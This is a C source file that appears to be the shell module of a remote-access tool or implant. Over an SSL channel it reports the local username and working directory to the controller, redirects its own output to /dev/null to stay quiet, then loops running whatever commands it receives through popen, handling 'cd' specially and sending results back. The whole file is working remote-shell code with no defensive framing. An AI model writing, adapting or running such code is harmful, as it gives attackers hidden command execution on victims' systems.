#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <openssl/ssl.h>
#include <unistd.h>
#include <limits.h>
#include <pwd.h>
#include <errno.h>
#include <fcntl.h>

#include "../Generic/send_receive.h"  

#define SEP "<sep>"
#define INITIAL_BUFFER_SIZE 4096
#define BUFFER_INCREMENT 4096


char* getuser() {
    struct passwd *pw = getpwuid(getuid());
    if (pw != NULL) {
        return pw->pw_name;
    } else {
        return "Unknown";
    }
}

char* getcwd_wrapper() {
    char* buffer = (char*)malloc(PATH_MAX);
    if (buffer != NULL) {
        if (getcwd(buffer, PATH_MAX) != NULL) {
            return buffer;
        } else {
            free(buffer);
            return NULL;
        }
    } else {
        return NULL;
    }
}

char* execute_command(char* command) {
    FILE *command_pipe = popen(command, "r");
    if (command_pipe != NULL) {
        size_t buffer_size = INITIAL_BUFFER_SIZE;
        char* buffer = (char*)malloc(buffer_size);
        if (buffer != NULL) {
            size_t total_bytes_read = 0;
            size_t bytes_read;
            while ((bytes_read = fread(buffer + total_bytes_read, 1, buffer_size - total_bytes_read, command_pipe)) > 0) {
                total_bytes_read += bytes_read;
                if (total_bytes_read >= buffer_size - 1) { // Check if buffer is full
                    // Expand buffer
                    buffer_size += BUFFER_INCREMENT;
                    char* new_buffer = (char*)realloc(buffer, buffer_size);
                    if (new_buffer == NULL) {
                        free(buffer);
                        pclose(command_pipe);
                        return NULL; // Memory allocation failed
                    }
                    buffer = new_buffer;
                }
            }
            buffer[total_bytes_read] = '\0'; // Null-terminate the buffer
            pclose(command_pipe);
            return buffer;
        } else {
            pclose(command_pipe);
            return NULL; // Memory allocation failed
        }
    } else {
        char* error_message = strerror(errno);
        if (strstr(error_message, "not found") != NULL) {
            // Command not found error
            return strdup("Command not found");
        } else {
            // Other errors
            return strdup(error_message);
        }
    }
}

void shell(SSL* ssl) {
    int stdout_backup, stderr_backup;
    char* username = getuser();
    char* cwd = getcwd_wrapper();
    if (username != NULL && cwd != NULL) {
        size_t total_length = strlen(username) + strlen(cwd) + strlen(SEP) + 1; // 1 for null terminator
        char* result = (char*)malloc(total_length);
        if (result != NULL) {
            snprintf(result, total_length, "%s%s%s", username, SEP, cwd);
            send_data(ssl, result);
            free(result);
        } else {
            send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
            return;
        }
    } else {
        send_data(ssl, "ERROR<sep>Error Getting username or CWD PLEASE EXIT");
        return;
    }

    // Redirect stdout and stderr to /dev/null
    int dev_null = open("/dev/null", O_WRONLY);
    if (dev_null != -1) {
        int stdout_backup = dup(STDOUT_FILENO);  
        int stderr_backup = dup(STDERR_FILENO);  
        
        if ((dup2(dev_null, STDOUT_FILENO) == -1) || (dup2(dev_null, STDERR_FILENO) == -1)) { 
            send_data(ssl, "ERROR<sep>Error Redirecting Output");
            return;
        }
        
        close(dev_null);
    } else {
        send_data(ssl, "Error Opening /dev/null");
    }

    while (true) {
        char* recv_command = receive_data(ssl);
        char* command_result;
        if (strcmp(recv_command, "exit") == 0) {
            free(recv_command);
            break;
        }
        if (strncmp(recv_command, "cd ", 3) == 0) {
        // Change directory
            if (chdir(recv_command + 3) == 0) {
                // Directory changed successfully
                command_result = strdup("");
            } else {
                // Error changing directory
                char* error_message = strerror(errno);
                command_result = strdup(error_message);
            }
        } else {
                 // Execute other commands
                command_result = execute_command(recv_command);
        }
        free(recv_command);
        if (command_result != NULL) {
            char* cwd = getcwd_wrapper();
            if (cwd != NULL) {
                size_t total_length = strlen(command_result) + strlen(cwd) + strlen(SEP) + 1;
                char* response = (char*)malloc(total_length);
                if (response != NULL) {
                    snprintf(response, total_length, "%s%s%s", command_result, SEP, cwd);
                    send_data(ssl, response);
                    free(response);
                } else {
                    send_data(ssl, "ERROR<sep>Error Sending Response");
                    return;
                }
                free(cwd);
            } else {
                send_data(ssl, "ERROR<sep>Error Getting CWD");
                return;

            }
            free(command_result);
        } else {
            send_data(ssl, "ERROR<sep>Error Executing Command");
            return;

        }
    }
    // Restore stdout and stderr
    dup2(stdout_backup, STDOUT_FILENO);
    dup2(stderr_backup, STDERR_FILENO);
}